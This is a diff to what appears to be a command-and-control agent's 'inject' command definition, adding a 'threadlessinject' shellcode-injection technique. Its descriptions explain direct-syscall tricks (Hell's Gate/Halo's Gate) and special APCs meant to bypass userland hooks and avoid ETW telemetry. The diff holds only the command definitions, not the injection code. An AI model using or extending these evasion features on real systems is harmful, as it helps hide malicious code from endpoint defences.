@@ -25,13 +25,17 @@ class InjectArguments(TaskArguments):
             CommandParameter(
                 name="technique",
                 type=ParameterType.ChooseOne,
-                choices=["createremotethread", "queueapcthread", "ntmapview"],
+                choices=["createremotethread", "queueapcthread", "ntmapview", "threadlessinject"],
                 default_value="createremotethread",
                 description=(
                     "createremotethread: VirtualAllocEx + CreateRemoteThread. "
                     "queueapcthread: VirtualAllocEx + QueueUserAPC on all threads. "
-                    "ntmapview: NtCreateSection+NtMapViewOfSection (backed section, avoids "
-                    "NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread."
+                    "ntmapview: NtCreateSection+NtMapViewOfSection (pagefile-backed, avoids "
+                    "NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread. "
+                    "threadlessinject: direct NT syscalls (HellsGate/Halo's Gate) + "
+                    "NtQueueApcThreadEx QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC — executes "
+                    "in any thread state, bypasses all ntdll userland hooks. "
+                    "Requires agent built with direct_syscalls=true."
                 ),
                 parameter_group_info=[ParameterGroupInfo(
                     group_name="Default", ui_position=2, required=False)],
@@ -46,13 +50,16 @@ class InjectArguments(TaskArguments):
 class InjectCommand(CommandBase):
     cmd = "inject"
     needs_admin = False
-    help_cmd = "inject -pid <PID> -shellcode <file> -technique createremotethread|queueapcthread|ntmapview"
+    help_cmd = "inject -pid <PID> -shellcode <file> -technique createremotethread|queueapcthread|ntmapview|threadlessinject"
     description = (
         "Inject shellcode into a running process by PID. "
-        "createremotethread: VirtualAllocEx (RW) → write → RX → CreateRemoteThread. "
-        "queueapcthread: VirtualAllocEx → write → RX → QueueUserAPC on all threads. "
-        "ntmapview: NtCreateSection+NtMapViewOfSection (pagefile-backed section, avoids "
-        "NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread."
+        "createremotethread: VirtualAllocEx (RW) -> write -> RX -> CreateRemoteThread. "
+        "queueapcthread: VirtualAllocEx -> write -> RX -> QueueUserAPC on all threads. "
+        "ntmapview: NtCreateSection+NtMapViewOfSection (pagefile-backed, avoids "
+        "NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread. "
+        "threadlessinject: direct NT syscalls (HellsGate/Halo's Gate) + "
+        "NtQueueApcThreadEx SPECIAL_USER_APC (executes in any thread state). "
+        "Requires agent built with direct_syscalls=true."
     )
     version = 1
     author = "@0xbbuddha"
